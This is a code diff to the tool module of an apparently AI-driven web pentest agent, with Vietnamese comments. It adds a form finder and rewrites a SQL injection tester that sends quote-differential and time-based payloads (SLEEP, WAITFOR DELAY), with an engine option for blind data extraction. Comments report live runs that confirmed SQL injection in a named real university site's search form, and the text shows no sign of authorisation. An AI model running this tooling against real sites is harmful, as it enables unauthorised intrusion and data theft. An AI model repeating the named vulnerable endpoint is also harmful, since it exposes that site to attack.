@@ -80,6 +80,20 @@ _MISSING_HINT: dict[str, str] = {
     "sqlmap": "Dùng sqli_manual_test / sqli_blind_extract (không cần sqlmap).",
 }
 
+# v1.4.3: trần timeout (giây) theo từng tool — chặn tool chạy quá lâu không tôn
+# trọng _timeout tốt (live-run: arjun đốt 427s). _dispatch áp
+# min(tool_timeout cấu hình, cap này). Tool không nằm trong dict dùng thẳng
+# tool_timeout của operator.
+# v1.4.4: nikto_scan 120→180s — 120s quá ngắn (live-run: kết quả rỗng vì bị
+# run_cmd giết giữa chừng trước khi kịp in findings); _nikto_scan truyền
+# -maxtime = _timeout-10 để nikto tự kết thúc đúng hạn.
+TOOL_TIMEOUTS: dict[str, int] = {
+    "param_discovery": 60,   # arjun -q có thể chạy rất lâu
+    "detect_cms": 90,        # whatweb -a 3 chậm trên site lớn
+    "subdomain_enum": 90,    # subfinder brute từ từ
+    "nikto_scan": 180,       # nikto vốn chậm — cap đủ cho scan trung bình
+}
+
 
 def available_tools() -> tuple[set, dict]:
     """(set tool khả dụng, dict {tool_name: binary thiếu}) — gọi 1 lần lúc khởi động.
@@ -164,8 +178,13 @@ def _subdomain_enum(**kw):
 
 
 def _nikto_scan(**kw):
+    """Quét nikto — v1.4.4: -maxtime suy từ _timeout (cap 180s → -maxtime 170)
+    để nikto TỰ KẾT THÚC trước khi run_cmd cắt (trước đây hardcode 120s: bị
+    giết giữa chừng → output rỗng → model không có dữ liệu)."""
     _need("nikto")
-    return run_cmd(["nikto", "-h", kw["url"], "-nointeractive", "-maxtime", "120"], kw["_timeout"])
+    tmax = max(30, int(kw.get("_timeout") or 90) - 10)
+    return run_cmd(["nikto", "-h", kw["url"], "-nointeractive",
+                    "-maxtime", str(tmax)], kw["_timeout"])
 
 
 # ─────────────────────────────────────────────
@@ -316,24 +335,244 @@ def _sqlmap_check(**kw):
     return run_cmd(args, kw["_timeout"])
 
 
-def _sqli_manual_test(**kw):
-    """Kiểm tra SQLi thủ công nhẹ nhàng: time-based với 2 payload so sánh."""
+def _find_forms(**kw):
+    """v1.4.4: GET url → parse <form>: action (resolve tuyệt đối), method, inputs.
+
+    Lý do tồn tại: agent mù với form POST (nikto/nuclei/http_probe không lấy được
+    form) → SQLi trong ô tìm kiếm (vd POST /WebTinTuc/TimKiem param=keyword của
+    tbu.edu.vn) không bao giờ được test. Tool này cho model biết endpoint + method
+    + param để gọi sqli_manual_test ĐÚNG chỗ.
+    """
+    import requests
+    from html.parser import HTMLParser
+    from urllib.parse import urljoin
+
     url = kw["url"]
-    param = kw["param"]
-    baseline, delay = kw.get("baseline", "id=1"), kw.get("delay_payload", "id=1 AND SLEEP(3)")
+    timeout = max(10, min(int(kw.get("_timeout") or 20), 25))
+
+    class _FormParser(HTMLParser):
+        MAX_FORMS = 15
+        MAX_INPUTS = 30
+
+        def __init__(self, base):
+            super().__init__()
+            self.base = base
+            self.forms: list[dict] = []
+            self._cur: dict | None = None
+
+        def _resolve_action(self, action: str) -> str:
+            if not action or action.strip() in ("#", ""):
+                return self.base
+            return urljoin(self.base, action.strip())
+
+        def handle_startendtag(self, tag, attrs):
+            self.handle_starttag(tag, attrs)  # <input/> self-closing
+
+        def handle_starttag(self, tag, attrs):
+            if len(self.forms) >= self.MAX_FORMS:
+                return
+            a = {k.lower(): (v or "") for k, v in attrs}
+            if tag.lower() == "form":
+                self._cur = {
+                    "action": self._resolve_action(a.get("action", "")),
+                    "method": (a.get("method") or "get").lower(),
+                    "enctype": (a.get("enctype") or ""),
+                    "id": a.get("id", ""),
+                    "name": a.get("name", ""),
+                    "inputs": [],
+                }
+                self.forms.append(self._cur)
+            elif self._cur is not None and tag.lower() in ("input", "textarea", "select"):
+                if len(self._cur["inputs"]) >= self.MAX_INPUTS:
+                    return
+                if tag.lower() == "select":
+                    it = {"name": a.get("name", ""), "type": "select"}
+                elif tag.lower() == "textarea":
+                    it = {"name": a.get("name", ""), "type": "textarea"}
+                else:
+                    it = {"name": a.get("name", ""),
+                          "type": (a.get("type") or "text").lower()}
+                if it["name"]:
+                    self._cur["inputs"].append(it)
+
+        def handle_endtag(self, tag):
+            if tag.lower() == "form":
+                self._cur = None
+
+    try:
+        r = requests.get(url, timeout=timeout, allow_redirects=True,
+                         headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0"})
+    except requests.RequestException as e:
+        return f"[!] find_forms — không GET được {url}: {e}"
+    if r.status_code >= 400:
+        return (f"[!] find_forms — {url} trả {r.status_code} ({len(r.content)} B). "
+                f"Thử URL khác (trang chủ / trang đăng nhập / trang có ô tìm kiếm).")
+    parser = _FormParser(r.url or url)
+    parser.feed((r.text or "")[:2_000_000])
+    forms = parser.forms
+    if not forms:
+        return (f"[i] find_forms — {url} → {r.status_code}, {len(r.text)} chars: "
+                f"KHÔNG có <form>. Thử URL khác (trang chủ hoặc trang có ô tìm kiếm/đăng nhập).")
+    lines = [f"[i] find_forms — {url} → {r.status_code}, {len(r.text)} chars, {len(forms)} form(s):"]
+    for i, frm in enumerate(forms, 1):
+        ins = ", ".join(f"{x['name']}({x['type']})" for x in frm["inputs"]) or "(không có input)"
+        extra = f" [enctype={frm['enctype']}]" if frm["enctype"] else ""
+        lines.append(f"  {i}. {frm['method'].upper()} {frm['action']}{extra}")
+        lines.append(f"     inputs: {ins}")
+    lines.append("[i] Ghi chú: gọi sqli_manual_test với url=action, method tương ứng, "
+                 "param=tên input cần test.")
+    return "\n".join(lines)
+
+
+def _form_from_payload(payload: str, param: str) -> dict:
+    """Chuyển payload form string sang dict POST data cho đúng param đang test.
+
+    - 'q=test' với param=q  → {"q": "test"}
+    - 'param=1 AND SLEEP(3)' (kiểu GET) → {"q": "1 AND SLEEP(3)"}
+    - 'keyword=x' với param=q → {"q": "x"} (đổi key về param)
+    """
+    p = (payload or "").strip()
+    if p.lower().startswith("param="):
+        p = p[len("param="):]
+    if "=" not in p:
+        return {param: p}
+    from urllib.parse import parse_qsl
+    first_key = p.split("&", 1)[0].split("=", 1)[0].strip()
+    if first_key != param:
+        val = p.split("&", 1)[0].split("=", 1)[1]
+        p = f"{param}={val}"
+    return dict(parse_qsl(p, keep_blank_values=True))
+
+
+def _guess_engine(resp) -> str:
+    """Ước lượng DB backend từ response headers (cho engine=auto).
+    ASP.NET/IIS → mssql; PHP → mysql; không có tín hiệu → "" (tool tự chọn mysql)."""
+    try:
+        hdrs = getattr(resp, "headers", None) or {}
+        raw = ""
+        for k in ("X-Powered-By", "Server", "X-AspNet-Version", "Set-Cookie"):
+            try:
+                raw += " " + str(hdrs.get(k, ""))
+            except Exception:  # noqa: BLE001
+                pass
+        low = raw.lower()
+        if any(t in low for t in ("asp.net", "microsoft-iis", "aspnetsessionid", "x-aspnet")):
+            return "mssql"
+        if "php" in low:
+            return "mysql"
+    except Exception:  # noqa: BLE001
+        pass
+    return ""
+
+
+def _sqli_manual_test(**kw):
+    """SQLi thủ công v2 (v1.4.4):
+
+    1) QUOTE-DIFFERENTIAL (error-based) — 3 request: baseline 'test' vs 'test'' vs "test'"
+       Nếu nháy đơn LÀM VỠ truy vấn (500/khác size) mà nháy đơn kép KHỚP baseline
+       → điểm chèn SQLi xác nhận, KHÔNG cần biết engine (hoạt động trên tbu.edu.vn
+       — form tìm kiếm MSSQL mà mọi payload time/boolean đều vỡ vì --
+       không dùng được).
+    2) TIME-BASED — chỉ chạy khi quote-differential không xác nhận: engine
+       mysql (SLEEP(n)) | mssql (WAITFOR DELAY '0:0:n') | auto (đoán từ headers,
+       mặc định mysql).
+    Trả verdict CONFIRMED/NOT_CONFIRMED kèm bằng chứng từng request. Bỏ tham số
+    baseline/delay_payload (model hay truyền rác như "0.80"/"3" ở v1.4.3).
+    """
     import time as t
     import requests
-    results = []
-    for label, payload in (("baseline", baseline), ("delay", delay)):
+
+    url = kw["url"]
+    param = kw.get("param") or ""
+    method = str(kw.get("method", "get")).lower().strip()
+    engine = str(kw.get("engine") or "auto").lower().strip()
+    if engine not in ("mysql", "mssql", "auto"):
+        return f"[!] sqli_manual_test: engine phải là mysql|mssql|auto (nhận '{engine}')."
+    if not param:
+        return ("[!] sqli_manual_test cần 'param' (tên tham số form). Chạy find_forms "
+                "trước để biết tên input (vd 'keyword') rồi gọi lại với param đó.")
+    delay = max(1, int(float(kw.get("delay") or 3)))
+    seed = "test"
+    req_timeout = max(15, delay + 5)
+
+    def send(value: str):
+        """(status, elapsed, len_content, response_or_err)"""
         try:
-            sep = "&" if "?" in url else "?"
-            r = requests.get(f"{url}{sep}{payload}", timeout=12,
-                             headers={"User-Agent": "Mozilla/5.0"})
-            results.append(f"{label}: status={r.status_code} time={r.elapsed.total_seconds():.2f}s "
-                           f"len={len(r.content)}")
-        except Exception as e:
-            results.append(f"{label}: lỗi {e}")
-    return "\n".join(results)
+            if method == "post":
+                r = requests.post(url, data=_form_from_payload(f"{param}={value}", param),
+                                  timeout=req_timeout,
+                                  headers={"User-Agent": "Mozilla/5.0"})
+            else:
+                sep = "&" if "?" in url else "?"
+                r = requests.get(f"{url}{sep}{param}={value}", timeout=req_timeout,
+                                 headers={"User-Agent": "Mozilla/5.0"})
+            return r.status_code, r.elapsed.total_seconds(), len(r.content), r
+        except requests.RequestException as e:
+            return 0, 0.0, 0, f"lỗi {e}"
+
+    rows = []  # (label, value, status, elapsed, length, resp)
+    b_st, b_el, b_ln, resp_b = send(seed)
+    rows.append(("baseline", seed, b_st, b_el, b_ln))
+
+    if engine == "auto":
+        hint = _guess_engine(resp_b)
+        if hint:
+            engine = hint
+        else:
+            engine = "mysql"  # mặc định khi không có tín hiệu header
+
+    q1 = send(seed + "'")
+    rows.append(("quote-single", seed + "'", q1[0], q1[1], q1[2]))
+    q2 = send(seed + "''")
+    rows.append(("quote-double", seed + "''", q2[0], q2[1], q2[2]))
+
+    def differs(st, ln) -> bool:
+        if st == 0:  # network error — không tính là tín hiệu SQL
+            return False
+        return st != b_st or abs(ln - b_ln) > max(200, b_ln * 0.1)
+
+    sensitive = differs(q1[0], q1[2])
+    doubled_ok = not differs(q2[0], q2[2])
+
+    time_rows = []
+    verdict, method_used = "NOT_CONFIRMED", ""
+    if sensitive and doubled_ok:
+        verdict, method_used = "CONFIRMED", "quote-differential (error-based)"
+    else:
+        # fallback time-based theo engine
+        pl = (f"{seed}' AND SLEEP({delay})-- -" if engine == "mysql"
+              else f"{seed}' AND WAITFOR DELAY '0:0:{delay}'-- -")
+        t_st, t_el, t_ln, _ = send(pl)
+        rows.append(("time-based", pl, t_st, t_el, t_ln))
+        time_rows.append((pl, t_st, t_el, t_ln))
+        delta = t_el - b_el
+        if t_st != 0 and delta >= max(1.5, delay * 0.6):
+            verdict, method_used = "CONFIRMED", f"time-based ({engine})"
+
+    lines = [f"[i] target: {method.upper()} {url} — param='{param}', engine={engine}, "
+             f"delay={delay}s"]
+    for label, value, st, el, ln in rows:
+        mark = ""
+        if label in ("quote-single", "quote-double", "time-based") and st != 0:
+            if label == "time-based":
+                mark = f" (delta {el - b_el:+.2f}s vs baseline)"
+            elif differs(st, ln):
+                mark = "  ← KHÁC baseline"
+            else:
+                mark = "  ← KHỚP baseline"
+        err = f" (request lỗi)" if st == 0 else ""
+        lines.append(f"[*] {label:<13} {param}='{value}' → {st or 'ERR'}, "
+                     f"{el:.2f}s, {ln} B{mark}{err}")
+    if verdict == "CONFIRMED":
+        lines.append(f"[✓] SQLI CONFIRMED — {method_used} tại param '{param}' "
+                     f"({method.upper()} {url})")
+    else:
+        lines.append(f"[-] SQLI NOT_CONFIRMED — quote-differential âm tính"
+                     + (f" và time-based {engine} không tạo phản hồi chậm" if time_rows else "")
+                     + ". Thử sqlmap_check/sqli_blind_extract hoặc param khác trong form "
+                       "(find_forms).")
+    lines.append(f"[+] verdict: {verdict}" + (f" — {method_used}" if method_used else ""))
+    return "\n".join(lines)
 
 
 def _sqli_blind_extract(**kw):
@@ -359,6 +598,7 @@ def _sqli_blind_extract(**kw):
         delay=float(kw.get("delay", 3.0)),
         threshold=float(kw.get("threshold", 2.5)),
         timeout=int(kw.get("timeout") or 15),
+        engine=str(kw.get("engine") or "mysql"),
     )
     try:
         res = ex.report(action,
@@ -790,6 +1030,11 @@ TOOL_REGISTRY: list[ToolSpec] = [
     ToolSpec("http_probe", "GET một URL: trả status code, headers chọn lọc, snippet body.",
              {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
               "required": ["url"]}, _http_probe, risk="safe"),
+    ToolSpec("find_forms", "GET một URL rồi parse HTML để liệt kê các form (action, method, input name/type). "
+             "Dùng BẮT BUỘC trước khi test SQLi qua form: model phải biết action + method + tên tham số. "
+             "Không gửi dữ liệu, chỉ đọc trang (risk=safe).",
+             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
+              "required": ["url"]}, _find_forms, risk="safe"),
     ToolSpec("dns_lookup", "Tra cứu DNS A records của domain.",
              {"type": "object", "properties": {"host": {"type": "string"}},
               "required": ["host"]}, _dns_lookup, risk="safe"),
@@ -828,13 +1073,23 @@ TOOL_REGISTRY: list[ToolSpec] = [
               "properties": {"url": {"type": "string", "pattern": "^https?://"},
                              "data": {"type": "string"}},
               "required": ["url"]}, _sqlmap_check, risk="active"),
-    ToolSpec("sqli_manual_test", "Test SQLi time-based thủ công nhẹ (2 request: control vs SLEEP(3)). "
-             "So sánh thời gian phản hồi.",
+    ToolSpec("sqli_manual_test", "Test SQLi thủ công: phát hiện quote-differential (error-based) qua test'/test'' "
+             "rồi fallback time-based (SLEEP cho mysql, WAITFOR DELAY cho mssql). "
+             "Hỗ trợ GET (?param=payload) VÀ POST (method='post' + data='q=test'). "
+             "engine=mysql|mssql|auto (auto đoán qua headers). Không cần baseline/delay_payload "
+             "— tool tự đo. Chạy find_forms TRƯỚC để biết action/method/param đúng.",
              {"type": "object",
               "properties": {"url": {"type": "string", "pattern": "^https?://"},
-                             "param": {"type": "string"},
-                             "baseline": {"type": "string"},
-                             "delay_payload": {"type": "string"}},
+                             "param": {"type": "string",
+                                        "description": "Tham số cần test (vd q hoặc keyword)"},
+                             "method": {"type": "string", "enum": ["get", "post"],
+                                         "description": "get (mặc định) hoặc post"},
+                             "data": {"type": "string",
+                                       "description": "Form data khi method=post, vd 'q=test' (tham số trùng param sẽ bị inject)"},
+                             "engine": {"type": "string", "enum": ["mysql", "mssql", "auto"],
+                                         "description": "DB engine: mysql (SLEEP), mssql (WAITFOR DELAY), auto đoán qua headers (mặc định)"},
+                             "delay": {"type": "number", "minimum": 1,
+                                        "description": "Giây sleep cho time-based payload (mặc định 3)"}},
               "required": ["url", "param"]}, _sqli_manual_test, risk="active"),
     ToolSpec("sqli_blind_extract",
              "SQLi time-based blind KHÔNG sqlmap: detect & extract dữ liệu bằng Python thuần "
@@ -859,7 +1114,9 @@ TOOL_REGISTRY: list[ToolSpec] = [
                   "threshold": {"type": "number", "minimum": 0.7,
                                  "description": "Ngưỡng delta giây để tính TRUE (mặc định 2.5)"},
                   "max_len": {"type": "integer", "minimum": 1, "maximum": 500,
-                               "description": "Độ dài tối đa của mỗi giá trị trích xuất"}},
+                               "description": "Độ dài tối đa của mỗi giá trị trích xuất"},
+                  "engine": {"type": "string", "enum": ["mysql", "mssql"],
+                              "description": "DB engine cho time-based payload: mysql (SLEEP, mặc định) hoặc mssql (WAITFOR DELAY)"}},
               "required": ["url"]},
              _sqli_blind_extract, risk="active"),
     ToolSpec("generate_poc",
